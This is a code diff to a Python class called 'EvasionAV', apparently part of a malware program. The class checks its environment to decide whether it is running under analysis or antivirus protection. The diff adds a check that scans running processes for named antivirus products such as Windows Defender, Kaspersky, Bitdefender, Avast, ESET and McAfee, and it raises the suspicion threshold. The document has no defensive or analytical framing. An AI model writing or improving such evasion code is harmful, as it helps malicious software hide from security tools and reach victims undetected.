@@ -24,7 +24,8 @@ class EvasionAV:
             self._check_memory_size,
             self._check_cpu_cores,
             self._check_recent_files,
-            self._check_security_tools
+            self._check_security_tools,
+            self._check_av_processes
         ]
         sospechoso = 0
         for check in checks:
@@ -35,7 +36,7 @@ class EvasionAV:
             except:
                 pass
             time.sleep(0.05)
-        if sospechoso >= 4:
+        if sospechoso >= 5:
             self.es_seguro = False
             return False
         return True
@@ -153,6 +154,21 @@ class EvasionAV:
             for proc in psutil.process_iter(['name']):
                 proc_name = proc.info['name'].lower()
                 if any(sus in proc_name for sus in suspicious_processes):
+                    return True
+        except:
+            pass
+        return False
+    
+    def _check_av_processes(self):
+        try:
+            import psutil
+            av_procs = [
+                'msmpeng', 'nissrv', 'avp', 'avgui', 'avguard', 'bdagent',
+                'avastsvc', 'avgnt', 'ekrn', 'nortonsecurity', 'mcshield'
+            ]
+            for proc in psutil.process_iter(['name']):
+                proc_name = proc.info['name'].lower()
+                if any(av in proc_name for av in av_procs):
                     return True
         except:
             pass
